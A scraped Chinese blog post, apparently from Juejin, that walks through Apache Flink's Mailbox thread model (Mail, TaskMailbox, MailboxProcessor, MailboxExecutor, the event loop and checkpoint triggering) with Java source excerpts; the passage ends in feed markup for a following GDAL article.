                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>本文我们来梳理 Flink 的线程模型——Mailbox。</p>
<h3 data-id="heading-0">写在前面</h3>
<p>在以前的线程模型中，Flink 通过 checkpointLock 来隔离保证不同线程在修改内部状态时的正确性。通过 checkpointLock 控制并发会在代码中出现大量的 <code>synchronize(lock)</code> 这样非常不利于阅读和调试。Flink 也提供了一些 API 将锁对象暴露给用户，如果没有正确使用锁，很容易导致线程安全问题。</p>
<p>为了解决这些问题，Flink 社区提出了基于 Mailbox 的线程模型。它是通过单线程加阻塞队列来实现。这样内部状态的修改就由单线程来完成了。</p>
<p>旧的线程模型中，checkpointLock 主要用在三个地方：</p>
<ul>
<li>Event Process：包括 event、watermark、barrier 的处理和发送</li>
<li>Checkpoint：包括 Checkpoint 的触发和完成通知</li>
<li>ProcessTime Timer：ProcessTime 的回调通常涉及对状态的修改</li>
</ul>
<p>在 Mailbox 模型中，将所有需要处理的事件都封装成 Mail 投递到 Mailbox 中，然后由单线程按照顺序处理。</p>
<h3 data-id="heading-1">相关定义</h3>
<p>下面我们来看 Mailbox 的具体实现，具体涉及到以下这些类。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9930735233954a9ca6f4521a08422be7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2i5ZCRR29vZ2xl57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769088505&amp;x-signature=WNLTdN0%2BeAj34Ex%2Beju9J8jh6Ho%3D" alt="Mailbox" loading="lazy"/></p>
<p>我们来逐个看一下这些类的定义和作用。</p>
<h4 data-id="heading-2">Mail</h4>
<p>在 Mailbox 线程模型中，Mail 是最基础的一个类，它用来封装需要处理的消息和执行的动作。Checkpoint Trigger 和 ProcessTime Trigger 都是通过 Mail 来触发的。Mail 中包含以下属性：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">// 选项，包括两个选项：isUrgent 和 deferrable</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> MailOptionsImpl mailOptions;

<span class="hljs-comment">// 要执行的动作</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ThrowingRunnable<span class="hljs-meta">&lt;?</span> <span class="hljs-keyword">extends</span> <span class="hljs-built_in">Exception</span>&gt; runnable;

<span class="hljs-comment">// 优先级，这里的优先级不决定执行顺序，而是避免上下游之间的死锁问题</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> priority;

<span class="hljs-comment">// 描述信息</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String descriptionFormat;

<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object[] descriptionArgs;

<span class="hljs-comment">// 用于执行 runnable 的执行器</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> StreamTaskActionExecutor actionExecutor;
</code></pre>
<h3 data-id="heading-3">TaskMailbox</h3>
<p>有了 Mail 之后，Flink 用 TaskMailbox 来存储它，在需要执行时，再从 TaskMailbox 中取出。具体的处理逻辑在 TaskMailboxImpl 中。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 内部对于 queue 和 state 的并发访问都需要被这个锁保护</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();

<span class="hljs-comment">// 实际存储 Mail 的队列</span>
<span class="hljs-meta">@GuardedBy("lock")</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Deque&lt;Mail&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayDeque</span>&lt;&gt;();

<span class="hljs-comment">// 与 lock 关联的 Condition，主要用于队列从空变为非空时唤醒等待获取 Mail 的线程</span>
<span class="hljs-meta">@GuardedBy("lock")</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Condition</span> <span class="hljs-variable">notEmpty</span> <span class="hljs-operator">=</span> lock.newCondition();

<span class="hljs-comment">// 状态，包括 OPEN/QUIESCED/CLOSED</span>
<span class="hljs-meta">@GuardedBy("lock")</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">State</span> <span class="hljs-variable">state</span> <span class="hljs-operator">=</span> OPEN;

<span class="hljs-comment">// 指定的邮箱线程的引用</span>
<span class="hljs-meta">@Nonnull</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Thread taskMailboxThread;

<span class="hljs-comment">// 用于性能优化的设计</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Deque&lt;Mail&gt; batch = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayDeque</span>&lt;&gt;();

<span class="hljs-comment">// queue队列是否为空，用于性能优化，避免频繁访问主队列</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">hasNewMail</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

<span class="hljs-comment">// 是否有紧急邮件，同样用于性能优化，减少检查队列中是否有紧急邮件的次数</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">hasNewUrgentMail</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
</code></pre>
<p>通过上面的属性，我们知道 TaskMailbox 底层是用 ArrayDeque 来存储 Mail 的，它内部包含了一个状态字段 state，state 的状态包括：</p>
<ul>
<li>OPEN：可以正常访问，接收和发送 Mail。</li>
<li>QUIESCED：处于静默状态，不接收新的 Mail，已有的 Mail 仍然可以被取出。</li>
<li>CLOSED：关闭状态，不能进行任何操作。</li>
</ul>
<p>在 TaskMailbox 内部，并发访问 queue 队列和 state 状态都需要 lock 这个锁的保护。此外 TaskMailbox 内部还做了一些性能优化，比如增加了 batch 队列，在处理 Mail 时，先将一批 Mail 从 queue 队列转移到 batch，之后会优先从 batch 队列中取，这样就减少了访问 queue 队列的次数，缓解了锁竞争压力。</p>
<h4 data-id="heading-4">MailboxProcessor</h4>
<p>MailboxProcessor 可以认为是 Mailbox 相关的核心入口，MailboxProcessor 的核心方法就是事件循环，这个循环中主要是从 TaskMailbox 中取出 Mail 执行相应动作和执行默认动作（MailboxDefaultAction）。</p>
<p>MailboxProcessor 还对外提供了 MailboxExecutor，其他组件可以利用 MailboxExecutor 来提交事件。</p>
<h4 data-id="heading-5">MailboxExecutor</h4>
<p>我们接着来看 MailboxExecutor，它的实现类是 MailboxExecutorImpl。包括以下属性：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 实际存储的 mailbox 实例</span>
<span class="hljs-meta">@Nonnull</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> TaskMailbox mailbox;

<span class="hljs-comment">// 优先级，MailboxExecutor 提供的默认优先级，提交 mail 时会带上这个字段</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> priority;

<span class="hljs-comment">// 执行器，运行 mail 的动作</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> StreamTaskActionExecutor actionExecutor;

<span class="hljs-comment">// 执行 MailboxProcessor，主要用于 isIdle 方法</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> MailboxProcessor mailboxProcessor;
</code></pre>
<p>MailboxExecutor 的主要作用是向 TaskMailbox 中投递 mail，核心方法是 execute。这个方法可以在任意线程中执行，因为 mailbox 内部控制了并发。</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_ invoke__">execute</span>(
        MailOptions mailOptions,
        <span class="hljs-keyword">final</span> ThrowingRunnable&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-built_in">Exception</span>&gt; command,
        <span class="hljs-keyword">final</span> String descriptionFormat,
        <span class="hljs-keyword">final</span> Object... descriptionArgs) {
    <span class="hljs-keyword">try</span> {
        mailbox.<span class="hljs-title function_ invoke__">put</span>(
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Mail</span>(
                        mailOptions,
                        command,
                        priority,
                        actionExecutor,
                        descriptionFormat,
                        descriptionArgs));
    } <span class="hljs-keyword">catch</span> (MailboxClosedException mbex) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RejectedExecutionException</span>(mbex);
    }
}
</code></pre>
<p>除了 execute 方法以外，MailboxExecutor 中还有一个重要的方法，就是 yield。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">yield</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
    <span class="hljs-type">Mail</span> <span class="hljs-variable">mail</span> <span class="hljs-operator">=</span> mailbox.take(priority);
    <span class="hljs-keyword">try</span> {
        mail.run();
    } <span class="hljs-keyword">catch</span> (Exception ex) {
        <span class="hljs-keyword">throw</span> WrappingRuntimeException.wrapIfNecessary(ex);
    }
}
</code></pre>
<p>这个方法的主要目的是为了让出对当前事件的处理。这么做的原因有二：</p>
<ol>
<li>如果不考虑优先级的因素，Mailbox 队列是 FIFO 的顺序处理，如果当前事件依赖后面的事件完成，则有可能造成”死锁“。</li>
<li>当前事件处理事件较长，会阻塞其他事件。因此需要让出执行权，让相同或更高优先级的事件有机会执行。</li>
</ol>
<p>需要注意的是 yield 方法只能有 mailbox 线程自身调用。另外，Flink 也提供了非阻塞版本的方法，就是 tryYield。</p>
<h3 data-id="heading-6">执行流程</h3>
<h4 data-id="heading-7">主流程</h4>
<p>在创建 StreamTask 时，会创建 mailboxProcessor，同时也会持有 mainMailboxExecutor。</p>
<pre><code class="hljs language-ini" lang="ini">new TaskMailboxImpl(Thread.currentThread()))<span class="hljs-comment">;</span>

...
<span class="hljs-attr">this.mailboxProcessor</span> =
        new MailboxProcessor(
                this::processInput, mailbox, actionExecutor, mailboxMetricsControl)<span class="hljs-comment">;</span>

...

<span class="hljs-attr">this.mainMailboxExecutor</span> = mailboxProcessor.getMainMailboxExecutor()<span class="hljs-comment">;</span>
</code></pre>
<p>可以看到这里将 processInput 作为 MailboxDefaultAction 传入 MailboxProcessor。在 StreamTask 启动时，会调用 MailboxProcessor 的核心方法。</p>
<pre><code class="hljs language-scss" lang="scss">public final void <span class="hljs-built_in">invoke</span>() throws Exception {
    <span class="hljs-comment">// Allow invoking method 'invoke' without having to call 'restore' before it.</span>
    if (!isRunning) {
        LOG<span class="hljs-selector-class">.debug</span>("Restoring during invoke will be called.");
        <span class="hljs-built_in">restoreInternal</span>();
    }

    <span class="hljs-comment">// final check to exit early before starting to run</span>
    <span class="hljs-built_in">ensureNotCanceled</span>();

    <span class="hljs-built_in">scheduleBufferDebloater</span>();

    <span class="hljs-comment">// let the task do its work</span>
    <span class="hljs-built_in">getEnvironment</span>()<span class="hljs-selector-class">.getMetricGroup</span>()<span class="hljs-selector-class">.getIOMetricGroup</span>()<span class="hljs-selector-class">.markTaskStart</span>();
    <span class="hljs-built_in">runMailboxLoop</span>();

    <span class="hljs-comment">// if this left the run() method cleanly despite the fact that this was canceled,</span>
    <span class="hljs-comment">// make sure the "clean shutdown" is not attempted</span>
    <span class="hljs-built_in">ensureNotCanceled</span>();

    <span class="hljs-built_in">afterInvoke</span>();
}

public void <span class="hljs-built_in">runMailboxLoop</span>() throws Exception {
    mailboxProcessor<span class="hljs-selector-class">.runMailboxLoop</span>();
}
</code></pre>
<p>runMailboxLoop 的核心逻辑是一个 while 循环，在循环中处理 mail 并执行默认动作。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">runMailboxLoop</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
    suspended = !mailboxLoopRunning;

    <span class="hljs-keyword">final</span> <span class="hljs-type">TaskMailbox</span> <span class="hljs-variable">localMailbox</span> <span class="hljs-operator">=</span> mailbox;

    checkState(
            localMailbox.isMailboxThread(),
            <span class="hljs-string">"Method must be executed by declared mailbox thread!"</span>);

    <span class="hljs-keyword">assert</span> localMailbox.getState() == TaskMailbox.State.OPEN : <span class="hljs-string">"Mailbox must be opened!"</span>;

    <span class="hljs-keyword">final</span> <span class="hljs-type">MailboxController</span> <span class="hljs-variable">mailboxController</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MailboxController</span>(<span class="hljs-built_in">this</span>);

    <span class="hljs-keyword">while</span> (isNextLoopPossible()) {
        <span class="hljs-comment">// The blocking `processMail` call will not return until default action is available.</span>
        processMail(localMailbox, <span class="hljs-literal">false</span>);
        <span class="hljs-keyword">if</span> (isNextLoopPossible()) {
            mailboxDefaultAction.runDefaultAction(
                    mailboxController); <span class="hljs-comment">// lock is acquired inside default action as needed</span>
        }
    }
}


<span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isNextLoopPossible</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 'Suspended' can be false only when 'mailboxLoopRunning' is true.</span>
    <span class="hljs-keyword">return</span> !suspended;
}
</code></pre>
<p>首先是做了前置检查，包括确保 TaskMailbox 是指定的 mailbox 线程，TaskMailbox 的状态是 OPEN。接着创建了 MailboxController，它用于 MailboxDefaultAction 与 MailboxProcessor 的交互。</p>
<p>然后就进入到 <code>while (isNextLoopPossible())</code> 循环了，循环中调用了 processMail，在这个方法中对 mail 进行处理。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">processMail</span><span class="hljs-params">(TaskMailbox mailbox, <span class="hljs-type">boolean</span> singleStep)</span> <span class="hljs-keyword">throws</span> Exception {
    <span class="hljs-comment">// Doing this check is an optimization to only have a volatile read in the expected hot</span>
    <span class="hljs-comment">// path, locks are only</span>
    <span class="hljs-comment">// acquired after this point.</span>
    <span class="hljs-type">boolean</span> <span class="hljs-variable">isBatchAvailable</span> <span class="hljs-operator">=</span> mailbox.createBatch();

    <span class="hljs-comment">// Take mails in a non-blockingly and execute them.</span>
    <span class="hljs-type">boolean</span> <span class="hljs-variable">processed</span> <span class="hljs-operator">=</span> isBatchAvailable &amp;&amp; processMailsNonBlocking(singleStep);
    <span class="hljs-keyword">if</span> (singleStep) {
        <span class="hljs-keyword">return</span> processed;
    }

    <span class="hljs-comment">// If the default action is currently not available, we can run a blocking mailbox execution</span>
    <span class="hljs-comment">// until the default action becomes available again.</span>
    processed |= processMailsWhenDefaultActionUnavailable();

    <span class="hljs-keyword">return</span> processed;
}
</code></pre>
<p>processMail 方法中先创建 batch，然后非阻塞的处理这批 mail。</p>
<pre><code class="hljs language-scss" lang="scss">private boolean <span class="hljs-built_in">processMailsNonBlocking</span>(boolean singleStep) throws Exception {
    long processedMails = <span class="hljs-number">0</span>;
    Optional&lt;Mail&gt; maybeMail;

    while (isNextLoopPossible() &amp;&amp; (maybeMail = mailbox.tryTakeFromBatch())<span class="hljs-selector-class">.isPresent</span>()) {
        if (processedMails++ == <span class="hljs-number">0</span>) {
            <span class="hljs-built_in">maybePauseIdleTimer</span>();
        }
        <span class="hljs-built_in">runMail</span>(maybeMail.get());
        if (singleStep) {
            break;
        }
    }
    if (processedMails &gt; <span class="hljs-number">0</span>) {
        <span class="hljs-built_in">maybeRestartIdleTimer</span>();
        return true;
    } else {
        return false;
    }
}

private void <span class="hljs-built_in">runMail</span>(Mail mail) throws Exception {
    mailboxMetricsControl<span class="hljs-selector-class">.getMailCounter</span>()<span class="hljs-selector-class">.inc</span>();
    mail<span class="hljs-selector-class">.run</span>();
    if (!suspended) {
        <span class="hljs-comment">// start latency measurement on first mail that is not suspending mailbox execution,</span>
        <span class="hljs-comment">// i.e., on first non-poison mail, otherwise latency measurement is not started to avoid</span>
        <span class="hljs-comment">// overhead</span>
        if (!mailboxMetricsControl.isLatencyMeasurementStarted()
                &amp;&amp; mailboxMetricsControl<span class="hljs-selector-class">.isLatencyMeasurementSetup</span>()) {
            mailboxMetricsControl<span class="hljs-selector-class">.startLatencyMeasurement</span>();
        }
    }
}
</code></pre>
<p>processMailsNonBlocking 直接调用 runMail 方法，最终是调用 <code>mail.run</code> 执行具体动作。</p>
<p>processMailsWhenDefaultActionUnavailable 的逻辑是如果当前默认动作不可用，会接着调用 runMail 尝试处理 Mail，这里会阻塞的等待，直到有新的需要处理的 Mail 或者默认动作可用。</p>
<p>当默认动作可用时，就会执行默认动作，也就是 <code>Stream.processInput</code>，这里就是处理 StreamRecord 了。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processInput</span><span class="hljs-params">(MailboxDefaultAction.Controller controller)</span> <span class="hljs-keyword">throws</span> Exception {
    <span class="hljs-type">DataInputStatus</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> inputProcessor.processInput();
    <span class="hljs-keyword">switch</span> (status) {
        <span class="hljs-keyword">case</span> MORE_AVAILABLE:
            <span class="hljs-keyword">if</span> (taskIsAvailable()) {
                <span class="hljs-keyword">return</span>;
            }
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> NOTHING_AVAILABLE:
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> END_OF_RECOVERY:
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<span class="hljs-string">"We should not receive this event here."</span>);
        <span class="hljs-keyword">case</span> STOPPED:
            endData(StopMode.NO_DRAIN);
            <span class="hljs-keyword">return</span>;
        <span class="hljs-keyword">case</span> END_OF_DATA:
            endData(StopMode.DRAIN);
            notifyEndOfData();
            <span class="hljs-keyword">return</span>;
        <span class="hljs-keyword">case</span> END_OF_INPUT:
            <span class="hljs-comment">// Suspend the mailbox processor, it would be resumed in afterInvoke and finished</span>
            <span class="hljs-comment">// after all records processed by the downstream tasks. We also suspend the default</span>
            <span class="hljs-comment">// actions to avoid repeat executing the empty default operation (namely process</span>
            <span class="hljs-comment">// records).</span>
            controller.suspendDefaultAction();
            mailboxProcessor.suspend();
            <span class="hljs-keyword">return</span>;
    }

    ...
}
</code></pre>
<p>当 status 是 MORE_AVAILABLE，表示还有更多数据可用立即处理，判断当前任务可用就立即返回。当 status 是 END_OF_INPUT 时，表示所有的输入都结束了，这时就会暂停循环事件的调用。</p>
<h4 data-id="heading-8">Checkpoint 流程</h4>
<p>触发 Checkpoint 的流程是调用 <code>Stream.triggerCheckpointAsync</code> 方法。</p>
<pre><code class="hljs language-scss" lang="scss">public CompletableFuture&lt;Boolean&gt; <span class="hljs-built_in">triggerCheckpointAsync</span>(
        CheckpointMetaData checkpointMetaData, CheckpointOptions checkpointOptions) {
    <span class="hljs-built_in">checkForcedFullSnapshotSupport</span>(checkpointOptions);

    MailboxExecutor<span class="hljs-selector-class">.MailOptions</span> mailOptions =
            CheckpointOptions<span class="hljs-selector-class">.AlignmentType</span><span class="hljs-selector-class">.UNALIGNED</span> == checkpointOptions<span class="hljs-selector-class">.getAlignment</span>()
                    ? MailboxExecutor<span class="hljs-selector-class">.MailOptions</span><span class="hljs-selector-class">.urgent</span>()
                    : MailboxExecutor.MailOptions.<span class="hljs-built_in">options</span>();

    CompletableFuture&lt;Boolean&gt; result = new CompletableFuture&lt;&gt;();
    mainMailboxExecutor<span class="hljs-selector-class">.execute</span>(
            mailOptions,
            () -&gt; {
                try {
                    boolean noUnfinishedInputGates =
                            Arrays<span class="hljs-selector-class">.stream</span>(getEnvironment()<span class="hljs-selector-class">.getAllInputGates</span>())
                                    <span class="hljs-selector-class">.allMatch</span>(InputGate::isFinished);

                    if (noUnfinishedInputGates) {
                        result<span class="hljs-selector-class">.complete</span>(
                                triggerCheckpointAsyncInMailbox(
                                        checkpointMetaData, checkpointOptions));
                    } else {
                        result<span class="hljs-selector-class">.complete</span>(
                                triggerUnfinishedChannelsCheckpoint(
                                        checkpointMetaData, checkpointOptions));
                    }
                } catch (Exception ex) {
                    <span class="hljs-comment">// Report the failure both via the Future result but also to the mailbox</span>
                    result<span class="hljs-selector-class">.completeExceptionally</span>(ex);
                    throw ex;
                }
            },
            "checkpoint %s with %s",
            checkpointMetaData,
            checkpointOptions);
    return result;
}
</code></pre>
<p>通过调用 <code>mainMailboxExecutor.execute</code> 方法来向 Mailbox 中提交 Mail。Checkpoint 完成的通知也是一样放在 Mailbox 中执行的，不过这里提交的是一个高优先级的操作。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">private</span> <span class="hljs-title class_">Future</span>&lt;<span class="hljs-title class_">Void</span>&gt; <span class="hljs-title function_">notifyCheckpointOperation</span>(<span class="hljs-params">
        RunnableWithException runnable, <span class="hljs-built_in">String</span> description</span>) {
    <span class="hljs-title class_">CompletableFuture</span>&lt;<span class="hljs-title class_">Void</span>&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompletableFuture</span>&lt;&gt;();
    mailboxProcessor
            .<span class="hljs-title function_">getMailboxExecutor</span>(<span class="hljs-title class_">TaskMailbox</span>.<span class="hljs-property">MAX_PRIORITY</span>)
            .<span class="hljs-title function_">execute</span>(
                    () -&gt; {
                        <span class="hljs-keyword">try</span> {
                            runnable.<span class="hljs-title function_">run</span>();
                        } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> ex) {
                            result.<span class="hljs-title function_">completeExceptionally</span>(ex);
                            <span class="hljs-keyword">throw</span> ex;
                        }
                        result.<span class="hljs-title function_">complete</span>(<span class="hljs-literal">null</span>);
                    },
                    description);
    <span class="hljs-keyword">return</span> result;
}
</code></pre>
<h3 data-id="heading-9">总结</h3>
<p>本文我们梳理了 Mailbox 相关的源码。Flink 通过 Mailbox 线程模型来简化相关代码逻辑。我们先了解了几个核心类：Mail、TaskMailbox、MailboxProcessor、MailboxExecutor。然后梳理了具体的事件处理和触发的流程。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[GDAL 创建矢量图层的两种方式]]></title>    <link>https://juejin.cn/post/7595142651728609299</link>    <guid>https://juejin.cn/post/7595142651728609299</guid>    <pubDate>2026-01-15T13:32:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595142651728609299" data-draft-id="7595178023257079827" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="GDAL 创建矢量图层的两种方式"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-15T13:32:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="GIS之路"/> <meta itemprop="url" content="https://juejin.cn/user/4346787284915481"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            GDAL 创建矢量图层的两种方式
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4346787284915481/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    GIS之路
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T13:32:29.000Z" title="Thu Jan 15 2026 13:32:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
